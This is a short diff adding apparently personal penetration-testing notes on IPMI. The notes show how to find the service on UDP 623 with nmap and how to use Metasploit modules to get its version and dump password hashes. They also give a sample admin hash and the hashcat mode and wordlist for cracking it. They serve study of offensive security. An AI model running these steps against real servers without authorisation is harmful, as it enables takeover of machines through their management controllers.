@@ -1,0 +1,25 @@
+Intelligent Platform Management Interface (IPMI) is a service on a computer (like a microcontroller) that monitors multiple systems; it's an autonomous subsystem;
+
+IPMI communicates over 623 UDP by default; gaining access to one of these systems is nearly equivalent to physical access to a system.
+
+if you've found one on udp, you can footprint the service using nmap to get more details:
+sudo nmap -sU --script ipmi-version -p 623 <target-ip>
+
+you can use metaploit here:
+msfconsole
+use auxiliary/scanner/ipmi/ipmi_version
+set rhosts <target-ip>
+show options
+run
+
+you can also try dumping hashes from the ipmi:
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set rhosts <target-ip>
+show options
+run
+
+you might get a hash like:
+admin:72b6ae83820000006d511ed01d6e10f53e08986fa22e69a20e723937805e23a14ab179d0d3a40b51a123456789abcdefa123456789abcdef140561646d696e:62686aacbfafa30f76988e478a132b57de4138f8
+
+hash mode may be 7300 (IPMI2 RAKP HMAC-SHA1)
+and I defaulted to rockyou.txt and best64.rule
